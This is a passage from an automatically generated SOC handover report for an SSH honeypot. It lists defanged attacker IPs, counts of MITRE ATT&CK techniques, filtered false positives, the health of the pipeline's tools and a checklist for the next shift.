| `71.6.232[.]28` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `122.187.227[.]144` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 31 |
| `31.208.54[.]221` | SE | Bredband2 AB | **100** ⚠️ | 1 |
| `103.67.78[.]132` | ID | PT Fazza Multi Transportasi | **100** ⚠️ | 50 |
| `221.10.221[.]104` | CN | China Unicom SiChuan province network | **100** ⚠️ | 46 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 58 cases |
| Tool 34  | Credential Extractor        | ✅ 43 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (8.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 15 recon entry/entries in table (4 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-23T22:30:16Z_
